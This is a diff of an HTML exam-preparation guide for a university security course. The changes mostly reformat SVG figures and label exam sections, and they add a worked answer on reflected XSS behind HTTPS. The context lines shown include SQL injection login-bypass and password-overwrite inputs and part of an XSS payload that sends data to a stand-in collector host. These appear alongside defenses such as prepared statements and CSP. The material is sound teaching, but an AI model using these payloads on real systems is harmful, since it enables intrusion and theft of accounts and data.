+Q 18.126 131.7168 18.126 135.5976
+L 18.126 164.4264
+Q 18.126 168.3072 22.032 168.3072
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-15-patch_8">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 214.542 168.3072 
-L 355.158 168.3072 
-Q 359.064 168.3072 359.064 164.4264 
-L 359.064 135.5976 
-Q 359.064 131.7168 355.158 131.7168 
-L 214.542 131.7168 
-Q 210.636 131.7168 210.636 135.5976 
-L 210.636 164.4264 
-Q 210.636 168.3072 214.542 168.3072 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 214.542 168.3072
+L 355.158 168.3072
+Q 359.064 168.3072 359.064 164.4264
+L 359.064 135.5976
+Q 359.064 131.7168 355.158 131.7168
+L 214.542 131.7168
+Q 210.636 131.7168 210.636 135.5976
+L 210.636 164.4264
+Q 210.636 168.3072 214.542 168.3072
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-15-patch_9">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 407.052 168.3072 
-L 547.668 168.3072 
-Q 551.574 168.3072 551.574 164.4264 
-L 551.574 135.5976 
-Q 551.574 131.7168 547.668 131.7168 
-L 407.052 131.7168 
-Q 403.146 131.7168 403.146 135.5976 
-L 403.146 164.4264 
-Q 403.146 168.3072 407.052 168.3072 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 407.052 168.3072
+L 547.668 168.3072
+Q 551.574 168.3072 551.574 164.4264
+L 551.574 135.5976
+Q 551.574 131.7168 547.668 131.7168
+L 407.052 131.7168
+Q 403.146 131.7168 403.146 135.5976
+L 403.146 164.4264
+Q 403.146 168.3072 407.052 168.3072
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-15-patch_10">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 169.670034 150.012 
-Q 188.595362 150.012 206.067247 150.012 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 169.670034 150.012
+Q 188.595362 150.012 206.067247 150.012
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 200.867247 147.412 
-L 206.067247 150.012 
-L 200.867247 152.612 
-L 200.867247 147.412 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 200.867247 147.412
+L 206.067247 150.012
+L 200.867247 152.612
+L 200.867247 147.412
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-15-patch_11">
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 362.180034 150.012 
-Q 381.105362 150.012 398.577247 150.012 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 362.180034 150.012
+Q 381.105362 150.012 398.577247 150.012
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-15-pa79c8006b0)" d="M 393.377247 147.412 
-L 398.577247 150.012 
-L 393.377247 152.612 
-L 393.377247 147.412 
+<path clip-path="url(#fig-15-pa79c8006b0)" d="M 393.377247 147.412
+L 398.577247 150.012
+L 393.377247 152.612
+L 393.377247 147.412
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -4483,7 +4483,7 @@ z
 <p><a id="s21"></a></p>
 </section><section class="question"><h3>S21 · 2022–23 · Q7(c)</h3>
 <p><strong>Stored versus reflected XSS · 7 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Briefly explain how reflected XSS differs from stored XSS.</p>
 </blockquote>
@@ -4497,7 +4497,7 @@ Reflected: crafted link → victim request → echoed response → victim execut
 <p><a id="s23"></a></p>
 </section><section class="question"><h3>S23 · 2022–23 · Q8(b)</h3>
 <p><strong>SMS 2FA against phishing · 8 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=14">root question PDF, page 14</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=14">root question PDF, page 14</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Is SMS-based two-factor authentication an effective defense against phishing? Justify.</p>
 </blockquote>
@@ -4522,82 +4522,82 @@ Reflected: crafted link → victim request → echoed response → victim execut
 </defs>
 <g id="fig-16-figure_1">
 <g id="fig-16-patch_1">
-<path d="M 0 277.848 
-L 575.28 277.848 
-L 575.28 0 
-L 0 0 
+<path d="M 0 277.848
+L 575.28 277.848
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-16-axes_1">
 <g id="fig-16-patch_2">
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 49.702673 55.764 
-Q 167.671096 55.764 284.186076 55.764 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 49.702673 55.764
+Q 167.671096 55.764 284.186076 55.764
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 278.986076 53.164 
-L 284.186076 55.764 
-L 278.986076 58.364 
-L 278.986076 53.164 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 278.986076 53.164
+L 284.186076 55.764
+L 278.986076 58.364
+L 278.986076 53.164
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-16-patch_3">
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 289.642673 93.4632 
-Q 407.611096 93.4632 524.126076 93.4632 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 289.642673 93.4632
+Q 407.611096 93.4632 524.126076 93.4632
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 518.926076 90.8632 
-L 524.126076 93.4632 
-L 518.926076 96.0632 
-L 518.926076 90.8632 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 518.926076 90.8632
+L 524.126076 93.4632
+L 518.926076 96.0632
+L 518.926076 90.8632
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-16-patch_4">
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 525.577327 131.1624 
-Q 287.639467 131.1624 51.155051 131.1624 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 525.577327 131.1624
+Q 287.639467 131.1624 51.155051 131.1624
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 56.355051 133.7624 
-L 51.155051 131.1624 
-L 56.355051 128.5624 
-L 56.355051 133.7624 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 56.355051 133.7624
+L 51.155051 131.1624
+L 56.355051 128.5624
+L 56.355051 133.7624
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-16-patch_5">
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 49.702673 168.8616 
-Q 167.671096 168.8616 284.186076 168.8616 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 49.702673 168.8616
+Q 167.671096 168.8616 284.186076 168.8616
 " style="fill: none; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 278.986076 166.2616 
-L 284.186076 168.8616 
-L 278.986076 171.4616 
-L 278.986076 166.2616 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 278.986076 166.2616
+L 284.186076 168.8616
+L 278.986076 171.4616
+L 278.986076 166.2616
 z
 " style="fill: #244a75; stroke: #244a75; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-16-patch_6">
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 289.642673 206.5608 
-Q 407.611096 206.5608 524.126076 206.5608 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 289.642673 206.5608
+Q 407.611096 206.5608 524.126076 206.5608
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 518.926076 203.9608 
-L 524.126076 206.5608 
-L 518.926076 209.1608 
-L 518.926076 203.9608 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 518.926076 203.9608
+L 524.126076 206.5608
+L 518.926076 209.1608
+L 518.926076 203.9608
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
 <g id="fig-16-line2d_1">
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 47.7 241.488 
-L 47.7 39.132 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 47.7 241.488
+L 47.7 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-16-line2d_2">
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 287.64 241.488 
-L 287.64 39.132 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 287.64 241.488
+L 287.64 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-16-line2d_3">
-<path clip-path="url(#fig-16-pee3946a4ce)" d="M 527.58 241.488 
-L 527.58 39.132 
+<path clip-path="url(#fig-16-pee3946a4ce)" d="M 527.58 241.488
+L 527.58 39.132
 " style="fill: none; stroke-dasharray: 3.7,1.6; stroke-dashoffset: 0; stroke: #bac8d5"></path>
 </g>
 <g id="fig-16-text_1">
@@ -4641,7 +4641,7 @@ L 527.58 39.132
 <p><a id="s24"></a></p>
 </section><section class="question"><h3>S24 · 2022–23 · Q8(c)</h3>
 <p><strong>Clickjacking with iframes; repeated-click redirection · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=14">root question PDF, page 14</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=14">root question PDF, page 14</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Describe clickjacking in two cases: (i) overlay a fake free-subscription button on an iframe advertisement so a visitor unknowingly clicks a paid buy button; (ii) an embedded public-exam result form whose first click goes to Twitter, second to Facebook, and third finally fetches the result.</p>
 </blockquote>
@@ -4666,69 +4666,69 @@ L 527.58 39.132
 </defs>
 <g id="fig-17-figure_1">
 <g id="fig-17-patch_1">
-<path d="M 0 216.864 
-L 575.28 216.864 
-L 575.28 0 
-L 0 0 
+<path d="M 0 216.864
+L 575.28 216.864
+L 575.28 0
+L 0 0
 z
 " style="fill: #ffffff"></path>
 </g>
 <g id="fig-17-axes_1">
 <g id="fig-17-patch_2">
-<path clip-path="url(#fig-17-pe4623215e2)" d="M 27.612 193.2552 
-L 397.008 193.2552 
-Q 400.914 193.2552 400.914 189.3744 
-L 400.914 46.8936 
-Q 400.914 43.0128 397.008 43.0128 
-L 27.612 43.0128 
-Q 23.706 43.0128 23.706 46.8936 
-L 23.706 189.3744 
-Q 23.706 193.2552 27.612 193.2552 
+<path clip-path="url(#fig-17-pe4623215e2)" d="M 27.612 193.2552
+L 397.008 193.2552
+Q 400.914 193.2552 400.914 189.3744
+L 400.914 46.8936
+Q 400.914 43.0128 397.008 43.0128
+L 27.612 43.0128
+Q 23.706 43.0128 23.706 46.8936
+L 23.706 189.3744
+Q 23.706 193.2552 27.612 193.2552
 z
 " style="fill: #244a75; fill-opacity: 0.05098; stroke: #244a75; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-17-patch_3">
-<path clip-path="url(#fig-17-pe4623215e2)" d="M 83.412 159.9912 
-L 341.208 159.9912 
-Q 345.114 159.9912 345.114 156.1104 
-L 345.114 102.3336 
-Q 345.114 98.4528 341.208 98.4528 
-L 83.412 98.4528 
-Q 79.506 98.4528 79.506 102.3336 
-L 79.506 156.1104 
-Q 79.506 159.9912 83.412 159.9912 
+<path clip-path="url(#fig-17-pe4623215e2)" d="M 83.412 159.9912
+L 341.208 159.9912
+Q 345.114 159.9912 345.114 156.1104
+L 345.114 102.3336
+Q 345.114 98.4528 341.208 98.4528
+L 83.412 98.4528
+Q 79.506 98.4528 79.506 102.3336
+L 79.506 156.1104
+Q 79.506 159.9912 83.412 159.9912
 z
 " style="fill: #267261; fill-opacity: 0.05098; stroke: #267261; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-17-patch_4">
-<path clip-path="url(#fig-17-pe4623215e2)" d="M 72.81 166.644 
-L 351.81 166.644 
-L 351.81 91.8 
-L 72.81 91.8 
+<path clip-path="url(#fig-17-pe4623215e2)" d="M 72.81 166.644
+L 351.81 166.644
+L 351.81 91.8
+L 72.81 91.8
 z
 " style="fill: #aa3d46; opacity: 0.12; stroke: #aa3d46; stroke-width: 2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-17-patch_5">
-<path clip-path="url(#fig-17-pe4623215e2)" d="M 181.062 150.012 
-L 246.348 150.012 
-Q 250.254 150.012 250.254 146.1312 
-L 250.254 125.6184 
-Q 250.254 121.7376 246.348 121.7376 
-L 181.062 121.7376 
-Q 177.156 121.7376 177.156 125.6184 
-L 177.156 146.1312 
-Q 177.156 150.012 181.062 150.012 
+<path clip-path="url(#fig-17-pe4623215e2)" d="M 181.062 150.012
+L 246.348 150.012
+Q 250.254 150.012 250.254 146.1312
+L 250.254 125.6184
+Q 250.254 121.7376 246.348 121.7376
+L 181.062 121.7376
+Q 177.156 121.7376 177.156 125.6184
+L 177.156 146.1312
+Q 177.156 150.012 181.062 150.012
 z
 " style="fill: #aa3d46; fill-opacity: 0.05098; stroke: #aa3d46; stroke-width: 1.2; stroke-linejoin: miter"></path>
 </g>
 <g id="fig-17-patch_6">
-<path clip-path="url(#fig-17-pe4623215e2)" d="M 497.730287 58.972805 
-Q 357.391946 90.413564 218.471893 121.536577 
+<path clip-path="url(#fig-17-pe4623215e2)" d="M 497.730287 58.972805
+Q 357.391946 90.413564 218.471893 121.536577
 " style="fill: none; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
-<path clip-path="url(#fig-17-pe4623215e2)" d="M 224.114512 122.936881 
-L 218.471893 121.536577 
-L 222.977707 117.862664 
-L 224.114512 122.936881 
+<path clip-path="url(#fig-17-pe4623215e2)" d="M 224.114512 122.936881
+L 218.471893 121.536577
+L 222.977707 117.862664
+L 224.114512 122.936881
 z
 " style="fill: #aa3d46; stroke: #aa3d46; stroke-width: 1.3; stroke-linecap: round"></path>
 </g>
@@ -4773,7 +4773,7 @@ z
 <p><a id="s38"></a></p>
 </section><section class="question"><h3>S38 · 2021–22 · Q7(b)</h3>
 <p><strong>Clickjacking versus phishing · 12 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=17">root question PDF, page 17</a>. Sitting date: 30 October 2023.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=17">root question PDF, page 17</a>. Sitting date: 30 October 2023. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Differentiate clickjacking and phishing with examples.</p>
 </blockquote>
@@ -4814,7 +4814,7 @@ z
 <p><a id="s60"></a></p>
 </section><section class="question"><h3>S60 · 2018–19 · Q4(b)</h3>
 <p><strong>Pharming versus phishing · 8 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=26">root question PDF, page 26</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=26">root question PDF, page 26</a>. Sitting date: 24 October 2019. Printed Section A.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Distinguish pharming and phishing, with examples.</p>
 </blockquote>
@@ -4856,7 +4856,7 @@ z
 <p><a id="s67"></a></p>
 </section><section class="question"><h3>S67 · 2018–19 · Q12(a)</h3>
 <p><strong>Stored XSS in a guest book; malicious page actions · 15 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=30">root question PDF, page 30</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=30">root question PDF, page 30</a>. Sitting date: 24 October 2019. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> As Sammy (id=40), write a script in the guest-book Message field to demonstrate XSS damage. The first paragraph has id p1 and the friend-add action for user id 100 is http://vulnerable.com/action/friend/add?id=100.</p>
 </blockquote>
@@ -4881,17 +4881,29 @@ fetch('https://collector.example/receive', {
 <p>The examples demonstrate three distinct consequences: integrity of displayed content, unauthorized authenticated actions, and confidentiality loss for data available to script. An attacker could also read accessible page data, alter forms or distribute a malicious lure. “All damages” cannot mean arbitrary OS file access: XSS remains subject to the browser sandbox and other controls.</p>
 <p><strong>Limits and defenses.</strong> HttpOnly prevents reading that cookie via document.cookie, but does not stop same-origin authenticated actions. CSP may block the inline script or export destination. Contextual escaping/sanitization of guest-book content is the root repair; avoid state-changing GETs, use CSRF protection, and apply CSP/cookie restrictions as additional controls. This payload assumes the vulnerable behavior stipulated by the exam rather than bypassing every modern defense.</p>
 <p><strong>Exam tip.</strong> Identify the victim as each visitor, not the attacker who submitted the entry, and use Sammy’s id rather than copying the endpoint’s example id unchanged.</p>
+<p><a id="s74"></a></p>
+</section><section class="question"><h3>S74 · 2023–24 · Q3(a)</h3>
+<p><strong>Limits of HTTPS/firewall/NIDS protection against reflected XSS · 10 printed marks (mixed question)</strong></p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=4">root question PDF, page 4</a>. Sitting date: 06 September 2025. Printed Section A.</p>
+<blockquote>
+<p><strong>Question summary:</strong> For the HTTPS-only server farm protected by a firewall and NIDS, assess whether reflected XSS can always be prevented when the attacker is on path.</p>
+</blockquote>
+<p><strong>Sec B scope:</strong> Only case (2), reflected XSS, is in Sec B scope. The other four network-defense cases are covered in Sec A. The printed 10 marks cover all five cases; no per-case mark allocation is given.</p>
+<p><strong>HTTPS plus a firewall/NIDS cannot always prevent reflected XSS.</strong> The vulnerable application can copy attacker-controlled input into a response as executable browser content. TLS can then deliver that response faithfully to the victim; it does not make the response safe. The script executes with the vulnerable page's origin and can perform actions available to that origin.</p>
+<p>A network IDS outside TLS termination normally cannot inspect the encrypted HTTP payload. Inspection at or after termination improves visibility, but a generic filtering rule still does not guarantee correct interpretation of every application output context. A passive NIDS may only alert rather than block anything.</p>
+<p>The primary repair is <strong>safe rendering at the application</strong>: apply encoding appropriate to the HTML, attribute, URL or script context; use safe templating and DOM APIs; and avoid interpreting untrusted input as executable markup or script. If rich HTML is genuinely required, use a suitable sanitizer with an explicit policy. A restrictive Content Security Policy can reduce impact as an additional layer. Neither the same-origin policy nor transport encryption repairs an injection already executing in the trusted page's origin.</p>
+<p><strong>Exam tip.</strong> Explain the layer boundary: authenticated transport and packet filtering do not guarantee that the application's response is safe to execute.</p>
 </section><h2>Lecture 12 — SQL Injection and CAPTCHAs</h2>
 <p>Primary source: <a href="../slides/lecture-12-sql-injection-and-captchas.pdf">lecture-12-sql-injection-and-captchas.pdf</a></p>
 <p><a id="s10"></a></p>
 <section class="question"><h3>S10 · 2023–24 · Q8(c)</h3>
 <p><strong>Login bypass; prepared statements · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=10">root question PDF, page 10</a>. Sitting date: 06 September 2025.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=10">root question PDF, page 10</a>. Sitting date: 06 September 2025. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> The backend concatenates username and password into SELECT * FROM users WHERE username=... AND password=.... The table includes Alice with password password123. Determine whether SQL injection is possible; give concrete login inputs to log in as Alice without her password; explain how prepared statements prevent it.</p>
 </blockquote>
 <p><strong>Yes: the SQL parser receives attacker-controlled syntax.</strong> Enter:</p>
-<pre><code class="language-text">username: alice' -- 
+<pre><code class="language-text">username: alice' --
 password: anything
 </code></pre>
 <p>The trailing space after <code>--</code> is intentional for MySQL-style comments. The resulting query is:</p>
@@ -4909,7 +4921,7 @@ accept only if row exists and password_verify(submitted_password, row.password_h
 <p><a id="s18"></a></p>
 </section><section class="question"><h3>S18 · 2022–23 · Q6(b)</h3>
 <p><strong>INSERT-query injection; bypass a cart quantity restriction · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=13">root question PDF, page 13</a>. Sitting date: 18 April 2024. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> WorstBUY executes a formatted INSERT INTO cart(session,item) statement for each POST request. Alice cannot add more than three items through the website. Construct a POST request that inserts 100 pens, then give a preventive measure against SQL injection.</p>
 </blockquote>
@@ -4934,7 +4946,7 @@ body = urlencode({"item": item})
 <p><a id="s41"></a></p>
 </section><section class="question"><h3>S41 · 2020–21 · Q5(b)</h3>
 <p><strong>Single-statement SQL injection in a password-change form · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=19">root question PDF, page 19</a>. Sitting date: 25 September 2022.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=19">root question PDF, page 19</a>. Sitting date: 25 September 2022. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> A C++ web server allows only one SQL statement per database call. Show how SQL injection in the displayed old-password/new-password login form can still change everyone’s password.</p>
 </blockquote>
@@ -4943,7 +4955,7 @@ body = urlencode({"item": item})
 WHERE username='CURRENT_USER' AND password='OLD'
 </code></pre>
 <p>Put the following in the new-password field (and anything in old password):</p>
-<pre><code class="language-text">chosen_password' WHERE 1=1 -- 
+<pre><code class="language-text">chosen_password' WHERE 1=1 --
 </code></pre>
 <p>After interpolation:</p>
 <pre><code class="language-sql">UPDATE users SET password='chosen_password' WHERE 1=1 -- '
@@ -4955,7 +4967,7 @@ WHERE username='CURRENT_USER' AND password='anything'
 <p><a id="s64"></a></p>
 </section><section class="question"><h3>S64 · 2018–19 · Q8(b)</h3>
 <p><strong>Short notes; answer any three of four · 9 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=28">root question PDF, page 28</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=28">root question PDF, page 28</a>. Sitting date: 24 October 2019. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Write short notes on any three: (i) Faraday cage, (ii) blind SQL injection, (iii) impersonation token, (iv) homograph attack.</p>
 </blockquote>
@@ -4968,7 +4980,7 @@ WHERE username='CURRENT_USER' AND password='anything'
 <p><a id="s65"></a></p>
 </section><section class="question"><h3>S65 · 2018–19 · Q11(a)</h3>
 <p><strong>UPDATE injection to change password and salary · 5 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=29">root question PDF, page 29</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=29">root question PDF, page 29</a>. Sitting date: 24 October 2019. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Use the displayed employee-password-change form and PHP code to set employee EID100’s password to you_are_hacked and salary to 10$, without knowing the old password.</p>
 </blockquote>
@@ -4979,7 +4991,7 @@ WHERE eid='EID' AND password='OLD'
 <p>Use these form values:</p>
 <pre><code class="language-text">EID:          EID100
 Old Password: anything
-New Password: you_are_hacked', salary=10 WHERE eid='EID100' -- 
+New Password: you_are_hacked', salary=10 WHERE eid='EID100' --
 </code></pre>
 <p>The space after <code>--</code> is intentional. The resulting single statement is:</p>
 <pre><code class="language-sql">UPDATE employee
@@ -4992,7 +5004,7 @@ WHERE eid='EID100' AND password='anything'
 <p><a id="s66"></a></p>
 </section><section class="question"><h3>S66 · 2018–19 · Q11(b)</h3>
 <p><strong>Rewrite vulnerable PHP using prepared statements · 10 marks</strong></p>
-<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=30">root question PDF, page 30</a>. Sitting date: 24 October 2019.</p>
+<p>Original: <a href="../../CSE405-Security_Merged.pdf#page=30">root question PDF, page 30</a>. Sitting date: 24 October 2019. Printed Section B.</p>
 <blockquote>
 <p><strong>Question summary:</strong> Change changepasswd.php to use a prepared statement so the SQL injection in Q11(a) is prevented.</p>
 </blockquote>
